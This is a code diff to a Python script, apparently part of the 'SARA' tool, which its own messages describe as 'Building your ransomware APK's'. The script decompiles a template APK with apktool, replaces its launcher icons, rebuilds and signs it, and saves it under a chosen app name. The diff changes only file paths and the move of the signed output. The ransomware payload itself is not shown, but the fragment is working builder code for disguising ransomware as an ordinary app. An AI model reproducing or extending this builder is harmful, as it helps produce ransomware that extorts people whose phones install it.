@@ -97,7 +97,7 @@ def start():
         else: continue
     print(w+"* Building your ransomware APK's ...")
     print(w+"-"*43+d)
-    os.system("sh $HOME/SARA/.data/apktool d $HOME/SARA/sara.apk -o /data/data/com.termux/files/home/SARA/saraa.apk")
+    os.system("sh $HOME/SARA/.data/apktool d /data/data/com.termux/files/home/SARA/sara.apk -o /data/data/com.termux/files/home/SARA/saraa.apk")
     imgpath = [
         "saraa.apk/res/drawable-mdpi-v4/ic_launcher.png",
         "saraa.apk/res/drawable-xhdpi-v4/ic_launcher.png",
@@ -128,15 +128,15 @@ def start():
                 os.system("rm -rf "+logo)
                 print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
         else: exit(1)
-    os.system("sh $HOME/SARA/.data/apktool b --aapt $HOME/SARA/.data/binaries/bin/aapt $HOME/SARA/saraa.apk -o /data/data/com.termux/files/home/SARA/sarah.apk;rm -rf saraa.apk")
+    os.system("sh $HOME/SARA/.data/apktool b --aapt $HOME/SARA/.data/binaries/bin/aapt /data/data/com.termux/files/home/SARA/saraa.apk -o /data/data/com.termux/files/home/SARA/sarah.apk;rm -rf saraa.apk")
     os.system("sh $HOME/SARA/.data/signapk publickey.x509.pem publickey.pk8 /data/data/com.termux/files/home/SARA/sarah.apk /data/data/com.termux/files/home/SARA/signed_sarah.apk > /dev/null 2>&1")
     os.system("rm -rf saraa.apk")
     if os.path.isfile("signed_sarah.apk"):
         out = app_name.replace(" ","").lower() + ".apk"
-        os.system("mv sarah.apk "+out)
+        os.system("mv signed_sarah.apk "+out)
+        os.system("mv sarah.apk /sdcard/sarah.apk")
         getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
     else: print(r+"[!]"+w+" Failed to signed APK's")
-
 if __name__ == "__main__":
     try:
         start()
